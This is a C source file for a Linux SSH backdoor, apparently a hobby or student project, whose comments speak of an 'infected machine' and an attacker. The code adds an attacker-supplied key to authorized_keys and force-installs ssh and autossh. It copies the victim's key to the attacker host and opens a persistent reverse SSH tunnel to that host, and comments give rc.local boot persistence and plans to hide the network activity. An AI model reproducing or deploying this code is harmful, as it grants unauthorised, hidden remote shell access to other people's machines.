#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "backdoor.h"

// aided by https://raymii.org/s/tutorials/Autossh_persistent_tunnels.html
//autossh https://linux.die.net/man/1/autossh

//do both of following commands on your own pc as well as pc your attacking
//sudo apt-get install openssh-client
//sudo apt-get install openssh-server

//generate key `ssh-keygen`, press enter all times asked for input
//`ssh-copy-id -i ~/.ssh/id_rsa user@host`

//on infected machine run `ssh -fN -R 7000:localhost:22 username@attackerPublicIp` to set up reverse connection
//on attacker machine run `ssh infectedUsername@localhost -p 7000 -i your_created_key`

//generate ssh key pair, add public one to vagrant machine

void backdoor_init() {
    //add the following command to `/etc/rc.local` so tunnel is created on boot
    //`sudo autossh -fN -M 10984 -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -o "StrictHostKeyChecking=no" -i ~/.ssh/id_rsa -R 7000:localhost:22 user@host -p 22 &`
    //then run `sudo chmod +x /etc/rc.local`

    FILE *config;
    char *my_parameters[3] = {NULL, NULL, NULL}; //[0] = my ssh rsa key, [1] = my username, [2] = my public ip
    size_t len = 0;

    config = fopen("backdoor_config.txt", "r");
    for(int i = 0; i < 3; i++) {
        getline(&my_parameters[i], &len, config);
    }
    fclose(config);

    //remove newline chars
    for(int i = 0; i < 3; i++){
        size_t len = strlen(my_parameters[i]) - 1;
        if (my_parameters[i][len] == '\n') my_parameters[i][len] = '\0';
    }

    //Adds my public key to end of authorized key file
    char input_addkey_auth[1000] = "echo '";
    strcat(input_addkey_auth, my_parameters[0]);
    strcat(input_addkey_auth, "'");
    strcat(input_addkey_auth, " >> ~/.ssh/authorized_keys");
    system(input_addkey_auth);

    //make sure target computer has required packages installed
    system("sudo apt-get -qq --yes --force-yes install openssh-client");
    system("sudo apt-get -qq --yes --force-yes install openssh-server");
    system("sudo apt-get -qq --yes --force-yes install autossh ssh");

    //generate ssh keys if they dont already exist. If they do exist then they are not overwritten
    FILE *fileExist;
    char output[5]; 
    fileExist = popen("[ -e ~/.ssh/id_rsa.pub ] && echo \"True\" || echo \"False\"", "r");
    fgets(output, sizeof(output), fileExist);
    fclose(fileExist);
    if( output[0] != 'T'){
        system("ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa");
    }

    //copy taget computers public ssh key to our computer, we have to enter out password here but only this time and never again.
    //TODO: add command flag and our password so this step is fully automatic
    char input_copyid[300] = "sudo cat ~/.ssh/id_rsa.pub | ssh -o StrictHostKeyChecking=no ";
    strcat(input_copyid, my_parameters[1]);
    strcat(input_copyid, "@");
    strcat(input_copyid, my_parameters[2]);
    strcat(input_copyid, " 'cat >> .ssh/authorized_keys && echo \"Key copied\"'");
    system(input_copyid);

    //change file permissions
    //system("sudo chmod 700 ~/.ssh");
    //system("sudo chmod 600 ~/.ssh/authorized_keys");
    //system("sudo chmod 600 ~/.ssh/id_*");

    //set up reverse ssh tunnel using auto ssh.  (auto ssh keeps tunnel active and re-activates if it goes down)
    char input_tunnel[300] = "autossh -f -nNT -i ~/.ssh/id_rsa -R 7000:localhost:22 ";
    //char input_tunnel[300] = "ssh -R 7000:localhost:22 ";
    strcat(input_tunnel, my_parameters[1]);
    strcat(input_tunnel, "@");
    strcat(input_tunnel, my_parameters[2]);
    //strcat(input_tunnel, " -i ~/.ssh/id_rsa");
    system(input_tunnel);

    //TODO: implement hide networking function/syscall, and call here
}

int main() {
    backdoor_init();
    return 0;
}